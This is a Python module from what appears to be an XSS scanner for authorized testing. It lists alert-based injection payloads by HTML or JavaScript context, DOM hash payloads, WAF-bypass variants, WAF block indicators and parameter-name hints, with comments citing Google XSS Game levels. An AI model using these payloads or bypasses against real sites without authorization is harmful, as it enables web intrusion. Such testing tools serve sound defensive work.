"""
XSS verification payloads for authorized security testing.
The payloads are limited to harmless alert-based execution checks.
"""

from __future__ import annotations

import secrets

MARKER_PREFIX = "xssmark"
SPECIAL_PROBE = "<xssmark>'\"&"


def new_marker() -> str:
    """Return a per-run unique marker to reduce false matches."""
    return f"{MARKER_PREFIX}_{secrets.token_hex(6)}"


CONTEXT_PAYLOADS = {
    "html_body": [
        "<script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
    ],
    "html_attribute_double": [
        '" autofocus onfocus=alert(1) x="',
        '"><svg onload=alert(1)>',
    ],
    "html_attribute_single": [
        "' autofocus onfocus=alert(1) x='",
        "'><svg onload=alert(1)>",
    ],
    "html_attribute_unquoted": [
        " autofocus onfocus=alert(1) x=",
        "><svg onload=alert(1)>",
    ],
    "js_string_double": [
        '";alert(1);//',
        "</script><script>alert(1)</script>",
    ],
    "js_string_single": [
        "';alert(1);//",
        "</script><script>alert(1)</script>",
    ],
    # HTML event handler attribute such as onload="startTimer('...')".
    # Level 4 of Google XSS Game is in this category.
    "event_handler_js_string_double": [
        '");alert(1);//',
    ],
    "event_handler_js_string_single": [
        "');alert(1);//",
    ],
    "event_handler_js": [
        "alert(1)//",
    ],
    # Requires browser click verification for <a href="javascript:alert(1)">.
    # Level 5 of Google XSS Game is in this category.
    "url_context": [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
    ],
    # js_block: marker is inside a <script> block but not inside a string literal
    "js_block": [
        "</script><script>alert(1)</script>",
        "\";alert(1);//",
        "';alert(1);//",
    ],
    "html_comment": [
        "--><svg onload=alert(1)>",
    ],
    "unknown": [
        "<svg onload=alert(1)>",
    ],
}

# Hash/fragment DOM XSS payloads. Level 3 of Google XSS Game needs a payload
# that breaks out of a single-quoted img src built from location.hash.
DOM_HASH_PAYLOADS = [
    "1' onerror='alert(1)",
    "1' onerror=alert(1) x='",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

WAF_BYPASS_PAYLOADS = {
    "html_body": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert`1`>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
    ],
    "html_attribute_double": [
        '" autofocus onfocus=alert`1` x="',
        '" onmouseover=alert(1) foo="',
    ],
    "html_attribute_single": [
        "' autofocus onfocus=alert`1` x='",
        "' onmouseover=alert(1) foo='",
    ],
    "html_attribute_unquoted": [
        " autofocus onfocus=alert`1` x=",
    ],
    "js_string_double": [
        '"+alert`1`+"',
        '";alert`1`//',
    ],
    "js_string_single": [
        "'+alert`1`+'",
        "';alert`1`//",
    ],
    "event_handler_js_string_double": [
        '");alert`1`//',
    ],
    "event_handler_js_string_single": [
        "');alert`1`//",
    ],
    "js_block": [
        "</script><script>alert(1)</script>",
        '";alert`1`//',
    ],
    "html_comment": [
        "--><svg/onload=alert(1)>",
    ],
    "unknown": [
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
}

WAF_INDICATORS = [
    "blocked",
    "forbidden",
    "access denied",
    "request rejected",
    "mod_security",
    "web application firewall",
    "security policy",
]

HIGH_VALUE_PARAM_NAMES = {
    "q", "query", "search", "keyword", "name", "title", "content", "comment",
    "message", "msg", "text", "body", "description", "review", "redirect",
    "url", "next", "return", "callback", "continue", "page", "path",
}

DANGEROUS_FORM_HINTS = {
    "delete", "remove", "logout", "payment", "pay", "withdraw", "reset",
    "password", "passwd", "admin", "role", "permission", "file", "upload",
}
